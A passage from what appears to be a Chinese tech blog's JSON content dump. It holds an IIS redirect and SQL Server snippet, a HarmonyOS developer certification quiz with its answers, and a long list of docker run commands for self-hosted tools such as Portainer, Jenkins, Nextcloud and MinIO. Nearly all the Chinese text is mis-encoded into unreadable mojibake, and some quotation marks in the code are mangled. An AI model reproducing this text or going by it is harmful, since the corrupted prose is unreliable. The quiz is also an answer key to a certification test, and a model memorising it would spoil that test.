Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx_log.ldf&#x27;--è®¾ç½®MULTI_USERæ¨¡å¼ALTER DATABASE [zx] SET MULTI_USER; iiséƒ¨ç½²è®¾ç½®æ–‡ä»¶å¤¹æƒé™ è®¾ç½®xx.comè·³è½¬www.xx.com 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://www.xx.com&quot; exactDestination=&quot;true&quot; httpResponseStatus=&quot;Permanent&quot; /&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"IIS","slug":"IIS","permalink":"https://banjinmei.github.io/tags/IIS/"}],"author":"mu"},{"title":"HarmonyOSåº”ç”¨å¼€å‘è€…åˆçº§è®¤è¯é¢˜ç›®(2024.11æ–°ç‰ˆï¼Œé¢˜ç›®&ç­”æ¡ˆ)","slug":"HarmonyOS-test","date":"2024-10-30T16:36:03.000Z","updated":"2024-11-19T14:06:24.177Z","comments":true,"path":"2024/10/31/HarmonyOS-test/","permalink":"https://banjinmei.github.io/2024/10/31/HarmonyOS-test/","excerpt":"","text":"HarmonyOSåº”ç”¨å¼€å‘è€…è®¤è¯é¢˜ç›®(2024.11æ–°ç‰ˆï¼Œé¢˜ç›®&amp;ç­”æ¡ˆ) c1 about åˆ¤æ–­é¢˜ 1.â€œä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²â€æŒ‡çš„æ˜¯ä¸€ä¸ªå·¥ç¨‹ï¼Œä¸€æ¬¡å¼€å‘ä¸Šæ¶ï¼Œå¤šç«¯æŒ‰éœ€éƒ¨ç½²ã€‚ä¸ºäº†å®ç°è¿™ä¸€ç›®çš„ï¼ŒHarmonyOSæä¾›äº†å¤šç«¯å¼€å‘ç¯å¢ƒï¼Œå¤šç«¯å¼€å‘èƒ½åŠ›ä»¥åŠå¤šç«¯åˆ†å‘æœºåˆ¶ã€‚ æ­£ç¡®(True) 2.ã€Šé¸¿è’™ç”Ÿæ€åº”ç”¨å¼€å‘ç™½çš®ä¹¦ã€‹å…¨é¢é˜é‡Šäº†é¸¿è’™ç”Ÿæ€ä¸‹åº”ç”¨å¼€å‘æ ¸å¿ƒç†å¿µã€å…³é”®èƒ½åŠ›ä»¥åŠåˆ›æ–°ä½“éªŒï¼Œæ—¨åœ¨å¸®åŠ©å¼€å‘è€…å¿«é€Ÿã€å‡†ç¡®ã€å…¨é¢çš„äº†è§£é¸¿è’™å¼€å‘å¥—ä»¶ç»™å¼€å‘è€…æä¾›çš„èƒ½åŠ›å…¨æ™¯å’Œæœªæ¥çš„æ„¿æ™¯ã€‚ æ­£ç¡®(True) 3.HUAWEI DevEco Studioæ˜¯é¢å‘HarmonyOSç”Ÿæ€çš„é›†æˆå¼€å‘ç¯å¢ƒï¼Œæä¾›äº†ä¸€ç«™å¼çš„HarmonyOSç”Ÿæ€åº”ç”¨å¼€å‘èƒ½åŠ›ã€‚ æ­£ç¡®(True) å•é€‰é¢˜ 1.å½“ç”¨æˆ·å¸Œæœ›èƒ½å¤Ÿåœ¨å¤šä¸ªè®¾å¤‡é—´æ¥å›åˆ‡æ¢ã€å®Œæˆå¤šä¸ªä»»åŠ¡ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å“ªä¸ªæ ¸å¿ƒèƒ½åŠ›ï¼Œä»¥ä¾¿åº”ç”¨ä¸é—´æ–­åœ°ç»™ç”¨æˆ·æä¾›æœåŠ¡çš„èƒ½åŠ›ã€‚ C. è‡ªç”±æµè½¬ 2.å½“æ‚¨å¸Œæœ›è·å–åˆ°æœ€å…¨é¢ã€æœ€è¯¦ç»†çš„åŠŸèƒ½æè¿°ã€å‚æ•°è¯´æ˜å’Œæƒé™ä¿¡æ¯æ—¶ï¼Œåº”è¯¥ä»ï¼ˆï¼‰å¯»æ‰¾ï¼Ÿ C. APIå‚è€ƒ 3.åº”ç”¨å¦‚éœ€åœ¨å¤šä¸ªè®¾å¤‡ä¸Šè¿è¡Œï¼Œéœ€è¦é€‚é…ä¸åŒçš„å±å¹•å°ºå¯¸å’Œåˆ†è¾¨ç‡ã€ä¸åŒçš„äº¤äº’æ–¹å¼ï¼ˆå¦‚è§¦æ‘¸å’Œé”®ç›˜ç­‰ï¼‰ã€ä¸åŒçš„ç¡¬ä»¶èƒ½åŠ›ï¼ˆå¦‚å†…å­˜å·®å¼‚å’Œå™¨ä»¶å·®å¼‚ç­‰ï¼‰ï¼Œå¼€å‘æˆæœ¬è¾ƒé«˜ã€‚â€œä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²â€æä¾›äº†å“ªä¸ªæ ¸å¿ƒèƒ½åŠ›é™ä½äº†å¤šè®¾å¤‡åº”ç”¨çš„å¼€å‘æˆæœ¬ï¼Ÿ B. å¤šç«¯å¼€å‘èƒ½åŠ› 4.å¦‚æœå¼€å‘è€…åœ¨åŸç”Ÿåº”ç”¨ç‰ˆæœ¬çš„åŸºç¡€ä¸Šï¼Œæƒ³è¦æä¾›å¤šç§æœåŠ¡ç»™ç”¨æˆ·ï¼Œå¼€å‘è€…é€‰æ‹©å¼€å‘åœºæ™¯çš„æœ€ä¼˜é€‰æ˜¯ï¼Ÿ B. å¼€å‘å¤šä¸ªå…ƒæœåŠ¡ï¼ŒæŒ‰éœ€ç»„åˆä¸ºä¸€ä¸ªå¤æ‚çš„åº”ç”¨ å¤šé€‰é¢˜ 1.ä¸‹åˆ—å“ªäº›é€‰é¡¹å±äºHarmonyOSä¸‰å¤§æŠ€æœ¯ç†å¿µã€‚ A. ä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²B. å¯åˆ†å¯åˆï¼Œè‡ªç”±æµè½¬C. ç»Ÿä¸€ç”Ÿæ€ï¼ŒåŸç”Ÿæ™ºèƒ½ 2.ç”¨æˆ·ä½¿ç”¨åº”ç”¨çš„æƒ…å¢ƒå‘ç”Ÿå˜åŒ–æ—¶ï¼ˆä¾‹å¦‚ä»å®¤å†…èµ°åˆ°æˆ·å¤–ã€ä»åŠå…¬å®¤åˆ°è½¦ä¸Šç­‰ï¼‰ï¼Œä¹‹å‰ä½¿ç”¨çš„è®¾å¤‡å¯èƒ½å·²ç»ä¸é€‚åˆç»§ç»­å½“å‰çš„ä»»åŠ¡ï¼Œæˆ–è€…å‘¨å›´æœ‰æ›´åˆé€‚çš„è®¾å¤‡ï¼Œæ­¤æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨æ–°çš„è®¾å¤‡æ¥ç»§ç»­å½“å‰çš„ä»»åŠ¡ã€‚ä»¥ä¸‹å“ªäº›åœºæ™¯é€‚åˆä½¿ç”¨è·¨ç«¯è¿ç§»èƒ½åŠ›ï¼Ÿ A. åœ¨å¤–æ—¶æ‰‹æœºä¸Šç¼–è¾‘é‚®ä»¶ï¼Œåˆ°å…¬å¸ååœ¨2in1è®¾å¤‡ä¸Šç»§ç»­ç¼–è¾‘B. åœ¨å¤–æ—¶æ‰‹æœºç©æ¸¸æˆï¼Œåˆ°å®¶åå¸Œæœ›è·å–æ›´å¥½çš„è§†è§‰ä½“éªŒï¼Œåœ¨å¹³æ¿ä¸Šç»§ç»­ç©C. åœ¨å®¶é‡Œæ™ºæ…§å±ä¸Šçœ‹è§†é¢‘ï¼Œå½“ä¸‹éœ€è¦å‡ºé—¨æ—¶ï¼Œå¯ä»¥æ‰‹æœºä¸Šç»§ç»­è§‚çœ‹D. æ‰‹æœºè§†é¢‘é€šè¯ä¸­ï¼Œåˆ°å®¶åå®¶ä¸­æœ‰æ™ºæ…§å±ï¼Œå¯ä»¥æ›´æ²‰æµ¸åœ°è§†é¢‘èŠå¤© 3.ä¸‹åˆ—å“ªäº›è¯´æ³•æ˜¯æ­£ç¡®çš„ã€‚ A. HUAWEI DevEco Studio æä¾›äº†è®¾å¤‡æ¨¡æ‹Ÿçš„èƒ½åŠ›ï¼Œè§£å†³HarmonyOSç”Ÿæ€åº”ç”¨ã€å…ƒæœåŠ¡å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„çœŸæœºè®¾å¤‡ä¸è¶³ã€æ— åˆ†å¸ƒå¼åº”ç”¨è°ƒè¯•ç¯å¢ƒç­‰é—®é¢˜ï¼Œä¸ºå¼€å‘è€…æä¾›ä½æˆæœ¬ã€æ˜“è·å–çš„è°ƒæµ‹éªŒè¯ç¯å¢ƒB. ä¸ºäº†é™ä½æ€§èƒ½è°ƒä¼˜æŠ€æœ¯éš¾åº¦ï¼ŒHUAWEI DevEco Studioæ¨å‡ºäº†åœºæ™¯åŒ–è°ƒä¼˜å·¥å…· DevEco ProfilerC. HUAWEI DevEco Studioæä¾›äº†ä¸€ç³»åˆ—å‘½ä»¤è¡Œå·¥å…·ï¼Œè¾…åŠ©å¼€å‘è€…æ›´é«˜æ•ˆçš„ç®¡ç† SDK ã€è®¾å¤‡ï¼Œæå‡è°ƒè¯•ã€è°ƒä¼˜çš„æ•ˆç‡D. HUAWEI DevEco Studioæ˜¯é¢å‘HarmonyOSç”Ÿæ€çš„é›†æˆå¼€å‘ç¯å¢ƒï¼Œæä¾›äº†ä¸€ç«™å¼çš„HarmonyOSç”Ÿæ€åº”ç”¨å¼€å‘èƒ½åŠ› c2 DevEco Studio åˆ¤æ–­é¢˜ 1.å¦‚æœä»£ç ä¸­æ¶‰åŠåˆ°ä¸€äº›ç½‘ç»œã€æ•°æ®åº“ã€ä¼ æ„Ÿå™¨ç­‰åŠŸèƒ½çš„å¼€å‘ï¼Œå‡å¯ä½¿ç”¨é¢„è§ˆå™¨è¿›è¡Œé¢„è§ˆã€‚ é”™è¯¯(False) 2.module.json5æ–‡ä»¶ä¸­çš„deviceTypeså­—æ®µä¸­ï¼Œé…ç½®äº†phoneï¼Œtabletï¼Œ2in1ç­‰å¤šç§è®¾å¤‡ç±»å‹ï¼Œæ‰èƒ½è¿›è¡Œå¤šè®¾å¤‡é¢„è§ˆã€‚ æ­£ç¡®(True) 3.DevEco Studioæ”¯æŒä»£ç è‡ªåŠ¨è¡¥å…¨ã€è‡ªåŠ¨å¯¼åŒ…ç­‰èƒ½åŠ›ã€‚ æ­£ç¡®(True) 1.ç”¨å“ªä¸€ç§è£…é¥°å™¨ä¿®é¥°çš„ç»„ä»¶å¯ä½œä¸ºé¡µé¢å…¥å£ç»„ä»¶ï¼š B. @Entry 2.ArkTS Stageæ¨¡å‹ï¼Œå…³äºå…¶å·¥ç¨‹ç›®å½•ç»“æ„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ï¼š D. app.json5ç”¨äºç¼–å†™åº”ç”¨çº§ç¼–è¯‘æ„å»ºä»»åŠ¡è„šæœ¬ 3.ä½¿ç”¨ä¸‹é¢å“ªä¸ªhdcå‘½ä»¤å¯ä»¥æŸ¥çœ‹è®¾å¤‡é“¾æ¥ä¿¡æ¯ B. hdc list targets 4.ç»„ä»¶é¢„è§ˆé€šè¿‡åœ¨ç»„ä»¶å‰æ·»åŠ ä¸‹é¢å“ªä¸ªæ³¨è§£ï¼š C. @Preview å¤šé€‰é¢˜ 1.å…³äºé¢„è§ˆå™¨çš„ä½¿ç”¨ï¼Œä»¥ä¸‹å“ªäº›è¯´æ³•æ˜¯æ­£ç¡®çš„ï¼š A. åœ¨å¼€å‘ç•Œé¢UIä»£ç è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ·»åŠ æˆ–åˆ é™¤äº†UIç»„ä»¶ï¼Œæ‚¨åªéœ€Ctrl+Sè¿›è¡Œä¿å­˜ï¼Œç„¶åé¢„è§ˆå™¨å°±ä¼šç«‹å³åˆ·æ–°é¢„è§ˆç»“æœB. åœ¨é¢„è§ˆå™¨ç•Œé¢ï¼Œå¯ä»¥åœ¨é¢„è§ˆå™¨ä¸­æ“ä½œåº”ç”¨&#x2F;æœåŠ¡çš„ç•Œé¢äº¤äº’åŠ¨ä½œï¼Œå¦‚å•å‡»ã€è·³è½¬ã€æ»‘åŠ¨ç­‰ï¼Œä¸åº”ç”¨&#x2F;æœåŠ¡è¿è¡Œåœ¨çœŸæœºè®¾å¤‡ä¸Šçš„ç•Œé¢äº¤äº’ä½“éªŒä¸€è‡´C. ç»„ä»¶é¢„è§ˆé€šè¿‡åœ¨ç»„ä»¶å‰æ·»åŠ æ³¨è§£@Previewå®ç°D. é¡µé¢é¢„è§ˆé€šè¿‡åœ¨å·¥ç¨‹çš„etsæ–‡ä»¶å¤´éƒ¨æ·»åŠ æ³¨è§£@Entryå®ç° 2.DevEco Studioä»£ç ç¼–è¾‘æ”¯æŒä¸‹é¢å“ªäº›èƒ½åŠ›ï¼š A. ä»£ç è‡ªåŠ¨è¡¥é½B. å®æ—¶æ£€æŸ¥C. è·¨è¯­è¨€è·³è½¬D. ä»£ç å¼•ç”¨æŸ¥æ‰¾E. å¿«é€ŸæŸ¥é˜…APIæ¥å£åŠç»„ä»¶å‚è€ƒæ–‡æ¡£ 3.DevEco Studioæ”¯æŒä½¿ç”¨å¤šç§è¯­è¨€è¿›è¡Œåº”ç”¨&#x2F;æœåŠ¡çš„å¼€å‘ï¼ŒåŒ…æ‹¬ArkTSã€JSå’ŒC&#x2F;C++ã€‚åœ¨ç¼–å†™åº”ç”¨&#x2F;æœåŠ¡é˜¶æ®µï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å“ªäº›æ–¹æ³•æå‡ç¼–ç æ•ˆç‡ï¼š A. æä¾›ä»£ç çš„æ™ºèƒ½è¡¥é½èƒ½åŠ›ï¼Œç¼–è¾‘å™¨å·¥å…·ä¼šåˆ†æä¸Šä¸‹æ–‡å¹¶ç†è§£é¡¹ç›®å†…å®¹ï¼Œå¹¶æ ¹æ®è¾“å…¥çš„å†…å®¹ï¼Œæç¤ºå¯è¡¥é½çš„ç±»ã€æ–¹æ³•ã€å­—æ®µå’Œå…³é”®å­—çš„åç§°ç­‰B. åœ¨ç¼–è¾‘å™¨ä¸­è°ƒç”¨ArkTS APIæ¥å£æˆ–ArkTS&#x2F;JSç»„ä»¶æ—¶ï¼Œæ”¯æŒåœ¨ç¼–è¾‘å™¨ä¸­å¿«é€Ÿã€ç²¾å‡†è°ƒå–å‡ºå¯¹åº”çš„å‚è€ƒæ–‡æ¡£C. ä»£ç æ ¼å¼åŒ–åŠŸèƒ½å¯ä»¥å¸®åŠ©æ‚¨å¿«é€Ÿçš„è°ƒæ•´å’Œè§„èŒƒä»£ç æ ¼å¼ï¼Œæå‡ä»£ç çš„ç¾è§‚åº¦å’Œå¯è¯»æ€§D. å¦‚æœè¾“å…¥çš„è¯­æ³•ä¸ç¬¦åˆç¼–ç è§„èŒƒï¼Œæˆ–è€…å‡ºç°è¯­ä¹‰è¯­æ³•é”™è¯¯ï¼Œç¼–è¾‘å™¨ä¼šæ˜¾ç¤ºé”™è¯¯æˆ–è­¦å‘Š c3 let const let stu:Array &#x3D;[â€˜aâ€™,â€™bâ€™];let stus:string [] &#x3D; [â€˜aâ€™,â€™bâ€™]; enum Color{ Red, Blue} let fvColor:Color&#x3D; Color.Red;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"docker pro","slug":"docker-pro","date":"2024-10-26T14:43:10.000Z","updated":"2024-11-26T16:33:51.703Z","comments":true,"path":"2024/10/26/docker-pro/","permalink":"https://banjinmei.github.io/2024/10/26/docker-pro/","excerpt":"","text":"docker è¿è¡Œæœ‰è¶£çš„é¡¹ç›® Portainer - å®¹å™¨ç®¡ç†é¢æ¿Portainer æä¾›äº†ä¸€ä¸ªç®€å•æ˜“ç”¨çš„ Web ç•Œé¢æ¥ç®¡ç†å’Œç›‘æ§ Docker å®¹å™¨ã€é•œåƒã€ç½‘ç»œç­‰ã€‚ä½ å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤å¿«é€Ÿå¯åŠ¨å®ƒï¼š 12docker volume create portainer_datadocker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce Jenkins - æŒç»­é›†æˆæœåŠ¡å™¨Jenkins æ˜¯ä¸€ä¸ªæµè¡Œçš„å¼€æºæŒç»­é›†æˆå·¥å…·ï¼Œç”¨äºè‡ªåŠ¨åŒ–æ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²è¿‡ç¨‹ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ Jenkinsï¼š 12docker run -u root --rm -d -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home jenkins/jenkins:ltsdocker logs &lt;containerId&gt; ç®¡ç†å¯†ç  ç™»å½•https://www.jenkins.io/doc/book/system-administration/viewing-logs/ Gitea - è‡ªæ‰˜ç®¡çš„ Git æœåŠ¡Gitea æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ä»£ç æ‰˜ç®¡å¹³å°ï¼Œé€‚åˆä¸ªäººæˆ–å°å›¢é˜Ÿä½¿ç”¨ã€‚ä½¿ç”¨ Docker è¿è¡Œ Gitea éå¸¸ç®€å•ï¼š 1docker run -d --name gitea -p 10022:22 -p 10080:3000 -v /path/to/gitea:/data gitea/gitea:latest Nextcloud - è‡ªå»ºäº‘ç›˜Nextcloud æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„è‡ªæ‰˜ç®¡æ–‡ä»¶åŒæ­¥ä¸åˆ†äº«è§£å†³æ–¹æ¡ˆï¼Œæ”¯æŒå¤šç§è®¾å¤‡è®¿é—®ã€‚å¯åŠ¨ Nextcloud çš„å‘½ä»¤å¦‚ä¸‹ï¼š 1docker run -d --name nextcloud -p 8080:80 -v /path/to/nextcloud-data:/var/www/html nextcloud è®¾å®šç®¡ç†å¯†ç  å³å¯ä½¿ç”¨ Pi-hole - å¹¿å‘Šæ‹¦æˆªDNSæœåŠ¡å™¨Pi-hole å¯ä»¥å¸®åŠ©ä½ æ‹¦æˆªå¹¿å‘Šã€è·Ÿè¸ªå™¨å’Œå…¶ä»–ä¸éœ€è¦çš„å†…å®¹ï¼Œä¸ºç½‘ç»œæµè§ˆä½“éªŒæä¾›æ›´å¥½çš„ä¿æŠ¤ã€‚å®‰è£…å’Œè¿è¡Œ Pi-hole å¾ˆç®€å•ï¼š 1docker run -d --name pihole --cap-add=NET_ADMIN --dns=127.0.0.1 --dns=8.8.8.8 -e TZ=Asia/Shanghai -p 53:53/tcp -p 53:53/udp -p 80:80 -p 443:443 -v &quot;$(pwd)&quot;/pihole:/etc/pihole -v &quot;$(pwd)&quot;/dnsmasq.d:/etc/dnsmasq.d pihole/pihole Ghost - åšå®¢å¹³å°Ghost æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„å¼€æºåšå®¢å¹³å°ï¼Œä¸“ä¸ºå‡ºç‰ˆè€Œè®¾è®¡ã€‚è¿è¡Œ Ghost çš„ Docker å®¹å™¨åªéœ€è¦ä¸€è¡Œå‘½ä»¤ï¼š 1docker run -d --name some-ghost -p 2368:2368 ghost Nginx - é«˜æ€§èƒ½çš„ Web å’Œåå‘ä»£ç†æœåŠ¡å™¨Nginx æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œå’Œé«˜æ•ˆçš„ Web æœåŠ¡å™¨ï¼Œé€‚ç”¨äºé™æ€ç½‘ç«™æˆ–ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ã€‚å¯åŠ¨ Nginx éå¸¸ç®€å•ï¼š 1docker run -d --name my-nginx -p 80:80 nginx WordPress - å¼€æºåšå®¢å¹³å°å’Œ CMSWordPress æ˜¯ä¸–ç•Œä¸Šæœ€å—æ¬¢è¿çš„åšå®¢å¹³å°ä¹‹ä¸€ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œå†…å®¹ç®¡ç†ç³»ç»Ÿ (CMS)ã€‚å¯åŠ¨ WordPress éœ€è¦åŒæ—¶è¿è¡Œ MySQL æ•°æ®åº“ï¼š 12345# å¯åŠ¨ MySQL æ•°æ®åº“docker run -d --name mysql-wordpress -e MYSQL_ROOT_PASSWORD=my-secret-pw -e MYSQL_DATABASE=wordpress -e MYSQL_USER=wordpress -e MYSQL_PASSWORD=my-secret-pw mysql:5.7# å¯åŠ¨ WordPressdocker run -d --name wordpress --link mysql-wordpress:mysql -p 8080:80 -e WORDPRESS_DB_HOST=mysql-wordpress:3306 -e WORDPRESS_DB_USER=wordpress -e WORDPRESS_DB_PASSWORD=my-secret-pw -e WORDPRESS_DB_NAME=wordpress wordpress PostgreSQL - å¼ºå¤§çš„å¼€æºå¯¹è±¡å…³ç³»å‹æ•°æ®åº“ç³»ç»ŸPostgreSQL æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§ä¸”å¯é çš„æ•°æ®åº“ç³»ç»Ÿã€‚å¯åŠ¨ PostgreSQL éå¸¸ç®€å•ï¼š 1docker run -d --name my-postgres -e POSTGRES_PASSWORD=mysecretpassword -p 5432:5432 postgres MongoDB - æ–‡æ¡£å‹ NoSQL æ•°æ®åº“MongoDB æ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„æ•°æ®åº“ï¼Œé€‚ç”¨äºå¤§æ•°æ®å¤„ç†ã€‚å¯åŠ¨ MongoDBï¼š 1docker run -d --name my-mongo -p 27017:27017 mongo Redis - é«˜æ€§èƒ½é”®å€¼å­˜å‚¨ç³»ç»ŸRedis æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„é”®å€¼æ•°æ®åº“ï¼Œå¸¸ç”¨äºç¼“å­˜å’Œæ¶ˆæ¯é˜Ÿåˆ—ã€‚å¯åŠ¨ Redisï¼š 1docker run -d --name my-redis -p 6379:6379 redis MinIO - é«˜æ€§èƒ½çš„å¯¹è±¡å­˜å‚¨ç³»ç»ŸMinIO æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„å¯¹è±¡å­˜å‚¨ç³»ç»Ÿï¼Œå…¼å®¹ Amazon S3 APIã€‚éå¸¸é€‚åˆç”¨æ¥æ­å»ºç§æœ‰äº‘å­˜å‚¨æœåŠ¡ã€‚å¯åŠ¨ MinIOï¼š 1docker run -d --name minio1 -p 9000:9000 -p 9001:9001 -e &quot;MINIO_ROOT_USER=minioadmin&quot; -e &quot;MINIO_ROOT_PASSWORD=minioadmin&quot; minio/minio server /data --console-address &quot;:9001&quot; Traefik - ç°ä»£çš„ HTTP åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡å™¨Traefik æ˜¯ä¸€ä¸ªç°ä»£çš„ HTTP åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡å™¨ï¼Œæ”¯æŒè‡ªåŠ¨å‘ç°åç«¯æœåŠ¡ã€‚å¯åŠ¨ Traefikï¼š 1docker run -d --name traefik -p 8080:8080 -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -v $PWD/traefik.yml:/etc/traefik/traefik.yml traefik:v2.5 æ³¨æ„ï¼šéœ€è¦åˆ›å»ºä¸€ä¸ª traefik.yml é…ç½®æ–‡ä»¶æ¥æŒ‡å®š Traefik çš„è¡Œä¸ºã€‚ NetData - å®æ—¶æ€§èƒ½ç›‘æ§å·¥å…·NetData æ˜¯ä¸€ä¸ªå®æ—¶æ€§èƒ½ç›‘æ§å·¥å…·ï¼Œå¯ä»¥ç›‘æ§æœåŠ¡å™¨çš„å„ç§æŒ‡æ ‡ã€‚å¯åŠ¨ NetDataï¼š 1docker run -d --name netdata -p 19999:19999 -v /host/proc:/host/proc:ro -v /etc/os-release:/host/etc/os-release:ro -v /sys:/host/sys:ro -v /etc/passwd:/host/etc/passwd:ro -v /etc/group:/host/etc/group:ro -v /etc/machine-id:/host/etc/machine-id:ro -v /var/lib/netdata:/netdata -v /etc/netdata:/etc/netdata -v /run/docker.sock:/var/run/docker.sock -e NETDATA_CLAIM_TOKEN=my-token -e NETDATA_CLAIM_URL=https://app.netdata.cloud -e NETDATA_CLAIM_ID=my-machine-id netdata/netdata è¿™äº›é¡¹ç›®ä¸ä»…åŠŸèƒ½å¼ºå¤§ï¼Œè€Œä¸”éå¸¸å®¹æ˜“é€šè¿‡ Docker å¿«é€Ÿå¯åŠ¨å’Œè¿è¡Œã€‚ å¼€å‘ç¯å¢ƒGolang - Go è¯­è¨€å¼€å‘ç¯å¢ƒGo æ˜¯ä¸€ç§é™æ€ç±»å‹çš„ç¼–è¯‘è¯­è¨€ï¼Œé€‚åˆæ„å»ºé«˜æ•ˆçš„æœåŠ¡å’Œåº”ç”¨ç¨‹åºã€‚å¯åŠ¨ä¸€ä¸ª Go è¯­è¨€çš„å¼€å‘ç¯å¢ƒï¼š 1docker run -it --name go-lang golang:latest Node.js - JavaScript è¿è¡Œæ—¶ç¯å¢ƒNode.js å…è®¸ä½ åœ¨æœåŠ¡å™¨ç«¯è¿è¡Œ JavaScript ä»£ç ã€‚å¯åŠ¨ä¸€ä¸ª Node.js ç¯å¢ƒï¼š 1docker run -it --name node-app node:latest Python - å¤šç”¨é€”ç¼–ç¨‹è¯­è¨€Python æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œé€‚ç”¨äºå„ç§åº”ç”¨åœºæ™¯ã€‚å¯åŠ¨ä¸€ä¸ª Python ç¯å¢ƒï¼š 1docker run -it --name python-env python:latest Flask - è½»é‡çº§ Web åº”ç”¨æ¡†æ¶Flask æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚å¯åŠ¨ä¸€ä¸ªç®€å•çš„ Flask åº”ç”¨ï¼š 1docker run -d --name flask-app -p 5000:5000 tiangolo/uwsgi-nginx-flask:python3.7 Django - é«˜çº§ Web æ¡†æ¶Django æ˜¯ä¸€ä¸ªé«˜çº§çš„ Python Web æ¡†æ¶ï¼Œé¼“åŠ±å¿«é€Ÿå¼€å‘å’Œå¹²å‡€ã€å®ç”¨çš„è®¾è®¡ã€‚å¯åŠ¨ä¸€ä¸ª Django åº”ç”¨ï¼š 1docker run -d --name django-app -p 8000:8000 python:3.9-slim bash -c &quot;pip install django &amp;&amp; django-admin startproject myproject &amp;&amp; cd myproject &amp;&amp; python manage.py runserver 0.0.0.0:8000&quot; React - å‰ç«¯ JavaScript åº“React æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„ JavaScript åº“ã€‚å¯åŠ¨ä¸€ä¸ª React å¼€å‘ç¯å¢ƒï¼š 1234567docker run -it --name react-app -p 3000:3000 node:14 bash# åœ¨å®¹å™¨å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤npm init react-app my-appcd my-appnpm startVue.js - å‰ç«¯ JavaScript æ¡†æ¶Vue.js æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„æ¸è¿›å¼æ¡†æ¶ã€‚å¯åŠ¨ä¸€ä¸ª Vue.js å¼€å‘ç¯å¢ƒï¼š 12345678docker run -it --name vue-app -p 8080:8080 node:14 bash# åœ¨å®¹å™¨å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤npm install -g @vue/clivue create my-appcd my-appnpm run serveGatsby - é™æ€ç«™ç‚¹ç”Ÿæˆå™¨Gatsby æ˜¯ä¸€ä¸ªåŸºäº React çš„é™æ€ç«™ç‚¹ç”Ÿæˆå™¨ï¼Œé€‚åˆæ„å»ºé™æ€ç½‘ç«™å’Œåšå®¢ã€‚å¯åŠ¨ä¸€ä¸ª Gatsby å¼€å‘ç¯å¢ƒï¼š 123456docker run -it --name gatsby-app -p 8000:8000 node:14 bash# åœ¨å®¹å™¨å†…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤npm install -g gatsby-cligatsby new my-sitecd my-sitegatsby develop docker chromium1docker pull registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest 1docker run -d --name=chromium -p 3000:3000 -v ./data:/config registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest Optional environment variablesVariable DescriptionCUSTOM_PORT Internal port the container listens on for http if it needs to be swapped from the default 3000.CUSTOM_HTTPS_PORT Internal port the container listens on for https if it needs to be swapped from the default 3001.CUSTOM_USER HTTP Basic auth username, abc is default.PASSWORD HTTP Basic auth password, abc is default. If unset there will be no authSUBFOLDER Subfolder for the application if running a subfolder reverse proxy, need both slashes IE &#x2F;subfolder&#x2F;TITLE The page title displayed on the web browser, default â€œKasmVNC Clientâ€.FM_HOME This is the home directory (landing) for the file manager, default â€œ&#x2F;configâ€.START_DOCKER If set to false a container with privilege will not automatically start the DinD Docker setup.DRINODE If mounting in &#x2F;dev&#x2F;dri for DRI3 GPU Acceleration allows you to specify the device to use IE &#x2F;dev&#x2F;dri&#x2F;renderD128LC_ALL Set the Language for the container to run as IE fr_FR.UTF-8 ar_AE.UTF-8NO_DECOR If set the application will run without window borders for use as a PWA.NO_FULL Do not autmatically fullscreen applications when using openbox.REMOTE_DEBUGGING æ˜¯å¦å¼€å¯è¿œç¨‹è°ƒè¯•ã€‚ é»˜è®¤æ˜¯ false ï¼Œå¯é€‰å€¼ï¼š true æˆ– falseHEADLESS 